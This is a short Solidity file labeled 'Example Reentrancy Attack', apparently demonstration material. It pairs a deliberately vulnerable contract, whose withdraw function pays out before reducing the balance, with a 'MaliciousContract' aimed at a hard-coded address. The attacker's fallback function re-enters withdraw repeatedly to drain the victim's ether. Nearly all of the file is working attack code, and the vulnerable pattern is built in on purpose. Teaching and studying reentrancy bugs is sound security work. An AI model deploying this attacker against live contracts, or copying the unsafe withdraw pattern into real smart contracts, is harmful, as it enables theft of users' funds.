pragma solidity 0.5.2;
// Example Reentrancy Attack

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        require(msg.value > 1);
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Not enough balance!");
        msg.sender.call.value(_amount)("");
        balances[msg.sender] -= _amount;
    }

    function getBalance() view public returns(uint) {
        return address(this).balance;
    }

    function() payable external {}
}

contract MaliciousContract {
    VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);

    function deposit() public payable {
        vulnerableContract.deposit.value(msg.value)();
    }

    function withdraw() public {
        vulnerableContract.withdraw(1 ether);
    }

    function getBalance() view public returns(uint) {
        return address(this).balance;
    }

    function () payable external {
        if(address(vulnerableContract).balance > 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }
}
